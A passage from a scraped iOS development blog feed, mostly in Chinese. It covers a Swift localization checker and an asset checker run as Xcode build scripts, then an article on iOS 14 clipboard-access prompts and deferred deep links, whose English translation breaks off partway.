\"NotificationCommentHerPhoto\"]*///主要語系let masterLanguage = \"en\"//開啟與係檔案a-z排序、整理功能let sanitizeFiles = false//專案是單一or多語系let singleLanguage = false//啟用檢查未翻譯語句功能let checkForUntranslated = true5. Build！成功！檢查結果提示類型： Build Error ❌ ： - [Duplication] 項目在語系檔案內存在重複- [Unused Key] 項目在語系檔案內有定義，但實際程式中未使用到- [Missing] 項目在語系檔案內未定義，但實際程式中有使用到- [Redundant] 項目在此語系檔相較於主要語系檔是多餘的- [Missing Translation] 項目在主要語系檔有，但在此語系檔缺漏 Build Warning ⚠️ ： - [Potentially Untranslated] 此項目未經翻譯（與主語系檔項目內容相同） 還沒結束，現在自動檢查提示有了，但我們還需要自行魔改一下。客製化匹配正規表示：回頭看檢查腳本 Localize.swift 頂部設定區塊 patterns 部分的第一項：\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\"匹配 Swift/ObjC的 NSLocalizedString() 方法，這個正規表示式只能匹配 \"Home.Title\" 這種格式的語句；假設我們是完整句子或有帶 Format 參數，則會被當誤當成 [Unused Key]。EX: \"Hi, %@ welcome to my app\"、\"Hello World!\" &lt;- 這些語句都無法匹配我們可以新增一條 patterns 設定、或更改原本的 patterns 成：\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\"主要是調整 NSLocalizedString 方法後的匹配語句，變成取任意字串直到 \" 出現就中止，你也可以 點此 依照自己的需求進行客製。加上語系檔案格式檢查功能：此腳本僅針對語系檔做內容對應檢查，不會檢查檔案格式是否正確（是否有忘記加「 ; 」），如果需要這個功能要自己加上！//....let formatResult = shell(\"plutil -lint \\(location)\")guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invaild] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return}//....func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output}增加 shell() 執行 shell script，使用 plutil -lint 檢查 plist 語系檔案格式正確性，有錯、少「;」會回傳錯誤，沒錯會回傳 OK 以此作為判斷！檢查的地方可加在 LocalizationFiles-&gt;process( ) -&gt; let location = singleLanguage… 後，約 135 行的地方或參考我最後提供的完整魔改版。其他客製化：我們可以依照自己的需求進行客製，例如把 error 換成 warning 或是拔掉某個檢查功能 (EX: Potentially Untranslated、Unused Key)；腳本就是 swift 我們都很熟悉！不怕改壞改錯！要讓 build 時出現 Error ❌：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"error: 錯誤訊息\")要讓 build 時出現 Warning ⚠️：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"warning: 警告訊息\")最終魔改版：#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// WHAT// 1. Find Missing keys in other Localisation files// 2. Find potentially untranslated keys// 3. Find Duplicate keys// 4. Find Unused keys and generate script to delete them all at once// MARK: Start Of Configurable Section/* You can enable or disable the script whenever you want */let enabled = true/* Put your path here, example -&gt; Resources/Localizations/Languages */let relativeLocalizableFolders = \"/streetvoice/SupportingFiles\"/* This is the path of your source folder which will be used in searching for the localization keys you actually use in your project */let relativeSourceFolder = \"/streetvoice\"/* Those are the regex patterns to recognize localizations. */let patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]/* Those are the keys you don't want to be recognized as \"unused\" For instance, Keys that you concatenate will not be detected by the parsing so you want to add them here in order not to create false positives :) */let ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", \"NotificationCommentHerPhoto\"]*/let masterLanguage = \"base\"/* Sanitizing files will remove comments, empty lines and order your keys alphabetically. */let sanitizeFiles = false/* Determines if there are multiple localizations or not. */let singleLanguage = false/* Determines if we should show errors if there's a key within the app that does not appear in master translations.*/let checkForUntranslated = false// MARK: End Of Configurable Sectionif enabled == false { print(\"Localization check cancelled\") exit(000)}// Detect list of supported languages automaticallyfunc listSupportedLanguages() -&gt; [String] { var sl: [String] = [] let path = FileManager.default.currentDirectoryPath + relativeLocalizableFolders if !FileManager.default.fileExists(atPath: path) { print(\"Invalid configuration: \\(path) does not exist.\") exit(1) } let enumerator = FileManager.default.enumerator(atPath: path) let extensionName = \"lproj\" print(\"Found these languages:\") while let element = enumerator?.nextObject() as? String { if element.hasSuffix(extensionName) { print(element) let name = element.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") sl.append(name) } } return sl}let supportedLanguages = listSupportedLanguages()var ignoredFromSameTranslation: [String: [String]] = [:]let path = FileManager.default.currentDirectoryPath + relativeLocalizableFoldersvar numberOfWarnings = 0var numberOfErrors = 0struct LocalizationFiles { var name = \"\" var keyValue: [String: String] = [:] var linesNumbers: [String: Int] = [:] init(name: String) { self.name = name process() } mutating func process() { if sanitizeFiles { removeCommentsFromFile() removeEmptyLinesFromFile() sortLinesAlphabetically() } let location = singleLanguage ? \"\\(path)/Localizable.strings\" : \"\\(path)/\\(name).lproj/Localizable.strings\" let formatResult = shell(\"plutil -lint \\(location)\") guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invaild] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return } guard let string = try? String(contentsOfFile: location, encoding: .utf8) else { return } let lines = string.components(separatedBy: .newlines) keyValue = [:] let pattern = \"\\\"(.*)\\\" = \\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) var ignoredTranslation: [String] = [] for (lineNumber, line) in lines.enumerated() { let range = NSRange(location: 0, length: (line as NSString).length) // Ignored pattern let ignoredPattern = \"\\\"(.*)\\\" = \\\"(.+)\\\"; *\\\\/\\\\/ *ignore-same-translation-warning\" let ignoredRegex = try? NSRegularExpression(pattern: ignoredPattern, options: []) if let ignoredMatch = ignoredRegex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: ignoredMatch.range(at: 1)) ignoredTranslation.append(key) } if let firstMatch = regex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: firstMatch.range(at: 1)) let value = (line as NSString).substring(with: firstMatch.range(at: 2)) if keyValue[key] != nil { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:\\(linesNumbers[key]!): \" + \"error: [Duplication] \\\"\\(key)\\\" \" + \"is duplicated in \\(name.uppercased()) file\" print(str) numberOfErrors += 1 } else { keyValue[key] = value linesNumbers[key] = lineNumber + 1 } } } print(ignoredFromSameTranslation) ignoredFromSameTranslation[name] = ignoredTranslation } func rebuildFileString(from lines: [String]) -&gt; String { return lines.reduce(\"\") { (r: String, s: String) -&gt; String in (r == \"\") ? (r + s) : (r + \"\\n\" + s) } } func removeEmptyLinesFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeCommentsFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { !$0.hasPrefix(\"//\") } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func sortLinesAlphabetically() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { let lines = string.components(separatedBy: .newlines) var s = \"\" for (i, l) in sortAlphabetically(lines).enumerated() { s += l if i != lines.count - 1 { s += \"\\n\" } } try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeEmptyLinesFromLines(_ lines: [String]) -&gt; [String] { return lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } } func sortAlphabetically(_ lines: [String]) -&gt; [String] { return lines.sorted() }}// MARK: - Load Localisation Files in memorylet masterLocalizationFile = LocalizationFiles(name: masterLanguage)let localizationFiles = supportedLanguages .filter { $0 != masterLanguage } .map { LocalizationFiles(name: $0) }// MARK: - Detect Unused Keyslet sourcesPath = FileManager.default.currentDirectoryPath + relativeSourceFolderlet fileManager = FileManager.defaultlet enumerator = fileManager.enumerator(atPath: sourcesPath)var localizedStrings: [String] = []while let swiftFileLocation = enumerator?.nextObject() as? String { // checks the extension if swiftFileLocation.hasSuffix(\".swift\") || swiftFileLocation.hasSuffix(\".m\") || swiftFileLocation.hasSuffix(\".mm\") { let location = \"\\(sourcesPath)/\\(swiftFileLocation)\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location: 0, length: (string as NSString).length) // Obj c wa regex?.enumerateMatches(in: string, options: [], range: range, using: { result, _, _ in if let r = result { let value = (string as NSString).substring(with: r.range(at: r.numberOfRanges - 1)) localizedStrings.append(value) } }) } } }}var masterKeys = Set(masterLocalizationFile.keyValue.keys)let usedKeys = Set(localizedStrings)let ignored = Set(ignoredFromUnusedKeys)let unused = masterKeys.subtracting(usedKeys).subtracting(ignored)let untranslated = usedKeys.subtracting(masterKeys)// Here generate Xcode regex Find and replace script to remove dead keys all at once!var replaceCommand = \"\\\"(\"var counter = 0for v in unused { var str = \"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[v]!): \" str += \"error: [Unused Key] \\\"\\(v)\\\" is never used\" print(str) numberOfErrors += 1 if counter != 0 { replaceCommand += \"|\" } replaceCommand += v if counter == unused.count - 1 { replaceCommand += \")\\\" = \\\".*\\\";\" } counter += 1}print(replaceCommand)// MARK: - Compare each translation file against master (en)for file in localizationFiles { for k in masterLocalizationFile.keyValue.keys { if file.keyValue[k] == nil { var str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[k]!): \" str += \"error: [Missing] \\\"\\(k)\\\" missing from \\(file.name.uppercased()) file\" print(str) numberOfErrors += 1 } } let redundantKeys = file.keyValue.keys.filter { !masterLocalizationFile.keyValue.keys.contains($0) } for k in redundantKeys { let str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(file.linesNumbers[k]!): \" + \"error: [Redundant key] \\\"\\(k)\\\" redundant in \\(file.name.uppercased()) file\" print(str) }}if checkForUntranslated { for key in untranslated { var str = \"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:1: \" str += \"error: [Missing Translation] \\(key) is not translated\" print(str) numberOfErrors += 1 }}print(\"Number of warnings : \\(numberOfWarnings)\")print(\"Number of errors : \\(numberOfErrors)\")if numberOfErrors &gt; 0 { exit(1)}func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output} 最後最後，還沒結束！當我們的 swift 檢查工具腳本都調試完成之後，要將其 compile 成執行檔減少 build 花費時間 ，否則每次 build 都要重新 compile 一次（約能減少 90% 的時間）。打開 terminal ，前往專案中檢查工具腳本所在目錄下執行：swiftc -o Localize Localize.swift然後再回頭到 Build Phases 更改 Script 內容路徑成執行檔EX: ${SRCROOT}/Localize完工！工具 2. Asset Checker 👮 圖片資源檢查工具功能： build 時自動檢查 檢查圖片缺漏：名稱有呼叫，但圖片資源目錄內沒有出現 檢查圖片多餘：名稱未使用，但圖片資源目錄存在的安裝方法： 下載工具的 Swift Script 檔案 放到專案目錄下 EX: ${SRCROOT}/AssetChecker.swift 打開專案設定 → iOS Target → Build Phases →左上角「+」 → New Run Script Phases → 在 Script 內容貼上路徑${SRCROOT}/AssetChecker.swift ${SRCROOT}/專案目錄 ${SRCROOT}/Resources/Images.xcassets//${SRCROOT}/Resources/Images.xcassets = 你 .xcassets 的位置可直接將設定參數帶在路徑上，參數1:專案目錄位置、參數2:圖片資源目錄位置；或跟語系檢查工具一樣編輯 AssetChecker.swift 頂部參數設定區塊：// Configure me \\o/// 專案目錄位置（用來搜索圖片有沒有在程式碼中使用到）var sourcePathOption:String? = nil// .xcassets 目錄位置var assetCatalogPathOption:String? = nil// Unused 警告忽略項目let ignoredUnusedNames = [String]()4. Build！ 成功！檢查結果提示類型： Build Error ❌ ： - [Asset Missing] 項目在程式內有呼叫使用，但圖片資源目錄內沒有出現 Build Warning ⚠️ ： - [Asset Unused] 項目在程式內未使用，但圖片資源目錄內有出現p.s 假設圖片是動態變數提供，檢查工具將無法識別，可將其加入 ignoredUnusedNames 中設為例外。其他操作同語系檢查工具，這邊就不做贅述；最重要的事是也要 記得調適完後要 compile 成執行檔，並更改 run script 內容為執行檔！開發自己的工具！ 我們可以參考圖片資源檢查工具腳本：#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// Configure me \\o/var sourcePathOption:String? = nilvar assetCatalogPathOption:String? = nillet ignoredUnusedNames = [String]()for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: sourcePathOption = arg case 2: assetCatalogPathOption = arg default: break }}guard let sourcePath = sourcePathOption else { print(\"AssetChecker:: error: Source path was missing!\") exit(0)}guard let assetCatalogAbsolutePath = assetCatalogPathOption else { print(\"AssetChecker:: error: Asset Catalog path was missing!\") exit(0)}print(\"Searching sources in \\(sourcePath) for assets in \\(assetCatalogAbsolutePath)\")/* Put here the asset generating false positives, For instance whne you build asset names at runtimelet ignoredUnusedNames = [ \"IconArticle\", \"IconMedia\", \"voteEN\", \"voteES\", \"voteFR\"] */// MARK : - End Of Configurable Sectionfunc elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}// MARK: - List Assetsfunc listAssets() -&gt; [String] { let extensionName = \"imageset\" let enumerator = FileManager.default.enumerator(atPath: assetCatalogAbsolutePath) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(extensionName) } // Is Asset .map { $0.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") } // Remove extension .map { $0.components(separatedBy: \"/\").last ?? $0 } // Remove folder path}// MARK: - List Used Assets in the codebasefunc localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #endif}// MARK: - Begining of scriptlet assets = Set(listAssets())let used = Set(listUsedAssetLiterals() + ignoredUnusedNames)// Generate Warnings for Unused Assetslet unused = assets.subtracting(used)unused.forEach { print(\"\\(assetCatalogAbsolutePath):: warning: [Asset Unused] \\($0)\") }// Generate Error for broken Assetslet broken = used.subtracting(assets)broken.forEach { print(\"\\(assetCatalogAbsolutePath):: error: [Asset Missing] \\($0)\") }if broken.count &gt; 0 { exit(1)}相較於語系檢查腳本，這個腳本簡潔且重要的功能都有，很有參考價值！P.S 可以看到程式碼出現 localizedStrings() 命名，懷疑作者是從語系檢查工具的邏輯搬來用，忘了改方法名稱ＸＤ例如：for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: //參數1 case 2: //參數2 default: break }}^接收外部參數的方法func elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}func localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #endif}^遍歷所有專案檔案並進行正則匹配的方法//要讓 build 時出現 Error ❌：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"error: 錯誤訊息\")//要讓 build 時出現 Warning ⚠️：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"warning: 警告訊息\")^print error or warning可以綜合參考以上的程式方法，自己打造想要的工具。總結這兩個檢查工具導入之後，我們在開發上就能更安心、更有效率並且減少冗餘；也因為這次經驗大開眼界，日後如果有什麼新的 build run script 需求都能直接使用最熟悉的語言 swift 來進行製作！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,931 Total Views Last Statistics Date: 2025-08-15 | 2,578 Views on Medium." }, { "title": "iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難", "url": "/posts/zrealm-dev/ios-14-%E5%89%AA%E8%B2%BC%E7%B0%BF%E7%AB%8A%E8%B3%87%E6%81%90%E6%85%8C-%E9%9A%B1%E7%A7%81%E8%88%87%E4%BE%BF%E5%88%A9%E7%9A%84%E5%85%A9%E9%9B%A3-8a04443024e2/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, ios-14, hacking, security", "date": "2020-07-02 21:51:36 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難為何那麼多 iOS APP 會讀取你的剪貼簿？Photo by Clint Patterson⚠️ 2022/07/22 Update: iOS 16 Upcoming Chang...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難為何那麼多 iOS APP 會讀取你的剪貼簿？Photo by Clint Patterson⚠️ 2022/07/22 Update: iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16議題剪貼簿被 APP 讀取時的頂部提示訊息iOS 14 開始會提示使用者 APP 讀取了您的剪貼簿，尤其中國大陸的 APP 本來就惡名昭彰，再加上媒體不斷的放大報導，造成不小的隱私恐慌；但其實不只中國 APP， 美國 、台灣、日本…世界各地很多大大小小的 APP 全都現形，那到底是為了什麼那麼多 APP 都需要讀取剪貼簿呢？Google Search安全剪貼簿可能包含個人隱私甚至密碼，如使用 1Password、LastPass…等密碼管理器複製密碼；APP 有能力讀取到就有能力回傳回伺服器記錄，一切看開發者的良心，真要查的話可透過使用 中間人嗅探 ，監聽 APP 回傳回伺服器的資料，是否包含剪貼簿資訊。淵源剪貼簿 API ，從 iOS 3 2009 年開始就有，只是從 iOS 14 開始會多跳提示告知使用者而已，中間已過十餘年，如果是惡意的 APP 也收集夠足夠的資料了。為何為何那麼多 APP 不論國內外都會在 打開時 讀取剪貼簿呢？這邊要先定義一下，我說的情況是 「APP 打開時」 ，而不是 APP 使用中讀取剪貼簿；APP 使用中讀取的情況比較偏是 APP 內的功能應用，像是 Goolge Map 自動貼上剛複製的地址、但也不排除有的 APP 會不斷偷取剪貼簿資訊。 「一把菜刀可以切菜也可以殺人，取決於用的人拿來做什麼」APP 打開時會讀取剪貼簿主要原因是要做「 iOS Deferred Deep Link 」 加強使用者體驗 ，如上流程所示；當一個產品同時提供網頁及APP時，我們更希望使用者能安裝 APP（因黏著度更高），所以當使用者瀏覽網頁版網站時會導引下載 APP，但我們希望下載完開啟 APP 會自動打開網頁離開時的頁面。 EX: 當我在 safari 逛 PxHome 手機網頁版 -&gt; 看到喜歡的產品想要購買 -&gt; PxHome 希望流量導 APP -&gt; 下載 APP -&gt; 打開 APP -&gt; 展現剛網頁看到的商品如果不這樣做，使用者只能 1. 回到網頁上再點一次 2. 在 APP 內重新搜尋一次產品；不管 1 還是 2 都會增加使用者購買上的困難及猶豫時間，可能就不買了！另一方面以營運來說，知道從哪個來源成功安裝的統計，對行銷、廣告預算投放都有很大的幫助。為何一定要用剪貼簿，有無其他替代方式？這是場 貓鼠遊戲 ，因為 iOS 蘋果本身不希望開發者有辦法反向追蹤使用者來源，iOS 9 之前的做法是將資訊存入網頁 Cookie，APP 安裝完後再讀取 Cookie 出來用，iOS 10 之後這條路被蘋果封住無法使用；退無可退大家才使用最終技 — 「用剪貼簿傳資訊」來達成，iOS 14 再次遞出新招，提示使用者讓開發者尷尬。另一條路是使用 Branch.io 的方式，記錄使用者輪廓(IP、手機資訊)，然後用搓合的方式讀取資訊，原理上可行，但需要投入大量人力(牽涉到後端、資料庫、APP)去研究實作，且可能會誤判或碰撞。 *對面的 Android Google 原本就支援此功能，不用像 iOS 這樣繞來繞去。受影響的 APP可能很多 APP 開發者都不知道自己也出現剪貼簿隱私問題，因為 Google 的 Firebase Dynamic Links 服務也是使用同樣的原理實現：// Reason for this string to ensure that only FDL links, copied to clipboard by AppPreview Page// JavaScript code, are recognized and used in copy-unique-match process. If user copied FDL to// clipboard by himself, that link must not be used in copy-unique-match process.// This constant must be kept in sync with constant in the server version at// durabledeeplink/click/ios/click_page.js 所以任何有使用到 Google Firebase Dynamic Links 服務的 APP 都可能中槍剪貼簿隱私問題！個人觀點資安問題是有的，但就是「 信任」 ，信任開發者是拿來做正確的事；如果開發者要做惡，有更多的地方可以做惡，例如：偷取信用卡資訊、偷記錄真實密碼…等等，都要比這個有效的多。 提示的用途就是讓使用者能注意到剪貼簿讀取的時間點，如果不合理就要小心！讀者提問Q：「TikTok 回應存取剪貼簿是為了偵測濫發垃圾訊息的行為」這種說法是正確的嗎？A：我個人認為只是找個理由搪塞輿論，抖音的意思應該是「為了防止使用者四處複製貼上廣告訊息」；但實際可以在訊息輸入完成時或是送出訊息時再做阻擋過濾，沒必要時時監聽使用者剪貼簿的資訊！難道剪貼簿有廣告或「敏感」訊息也要管？我又沒貼上發表出去。開發者能做的事若手邊沒有備用機可升級 iOS 14 測試，可先從 Apple 下載 XCode 12 用模擬器測看看。一切都還太新，如果你是串 Firebase 可以先參考 Firebase-iOS-SDK/Issue #5893 更新到最新的 SDK。如果是自己實作 DeepLink 可以參考 Firebase-iOS-SDK #PR 5905 的修改：Swift:if #available(iOS 10.0, *) { if (UIPasteboard.general.hasURLs) { //UIPasteboard.general.string }} else { //UIPasteboard.general.string}Objective-C:if (@available(iOS 10.0, *)) { if ([[UIPasteboard generalPasteboard] hasURLs]) { //[UIPasteboard generalPasteboard].string; } } else { //[UIPasteboard generalPasteboard].string; } return pasteboardContents;}先檢查剪貼簿內容是否為網址（配合網頁 JavaScript 複製的內容是網址帶參數）是才讀取，就不會每次開啟 APP 都跳剪貼簿被讀取。 目前只能如此，提示跳還是會跳，就只是讓他更聚焦一點另外蘋果也增加了新的 API： DetectPattern ，幫助開發者能更精確判斷剪貼簿資訊是我們要的，然後再讀取，再跳提示，使用者能更安心、開發者也能繼續使用此功能。 DetectPattern 也還在 Beta、且僅能使用 Objective-C 實作。或是… 改用 Branch.io 自行實作 Branch.io 的原理 APP 先跳客製化 Alert 告知使用者，再讀取剪貼簿（讓使用者安心） 加入新隱私權條款 iOS 14 最新的 App Clips?，網頁 -&gt; 導 App Clips 輕量使用 -&gt; 深入操作導 APP延伸閱讀 iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS+MacOS 使用mitmproxy 進行中間人嗅探 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 15,376 Total Views Last Statistics Date: 2025-08-15 | 15,339 Views on Medium." }, { "title": "iOS 14 Clipboard Privacy Panic: The Dilemma of Privacy vs. Convenience", "url": "/posts/zrealm-dev/en/ios-14-clipboard-privacy-panic-the-dilemma-of-privacy-vs-convenience-8a04443024e2/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, ios-14, hacking, security", "date": "2020-07-02 21:51:36 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS 14 Clipboard Privacy Panic: The Dilemma of Privacy vs. ConvenienceWhy do so many...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS 14 Clipboard Privacy Panic: The Dilemma of Privacy vs. ConvenienceWhy do so many iOS apps read your clipboard?Photo by Clint Patterson⚠️ Update on 2022/07/22: Upcoming Changes in iOS 16Starting from iOS ≥ 16, when users do not actively paste, apps that attempt to read the clipboard will trigger a prompt asking for permission. Users must click “Allow” for the app to access clipboard information.UIPasteBoard’s privacy change in iOS 16IssuesTop notification message when the clipboard is accessed by an appStarting with iOS 14, users are notified when an app reads their clipboard. This has caused significant privacy panic, especially with apps from mainland China, which are already notorious. The media has amplified these reports, but it’s not just Chinese apps; many apps from the United States, Taiwan, Japan, and around the world have been revealed to do the same. So why do so many apps need to read the clipboard?Google SearchSecurityThe clipboard may contain personal information, including passwords, such as those copied from password managers like 1Password or LastPass. If an app can read this information, it can also send it back to a server. It all depends on the developer’s integrity. If someone wants to investigate, they can use man-in-the-middle sniffing to monitor what data the app sends back to the server, including clipboard information.BackgroundThe Clipboard API has existed since iOS 3 in 2009, but starting with iOS 14, users receive prompts notifying them of clipboard access. Over the years, malicious apps could have already collected sufficient data.WhyWhy do so many apps, both domestic and international, read the clipboard upon opening?Here, I want to clarify that I am referring to the situation when the app is opened, not when the app is actively using the clipboard. Reading the clipboard during app usage is typically related to specific functionalities, such as Google Maps automatically pasting a recently copied address. However, some apps may continuously steal clipboard information. “A knife can be used to chop vegetables or to kill someone; it depends on what the user intends to do with it.”The primary reason apps read the clipboard upon opening is to implement iOS Deferred 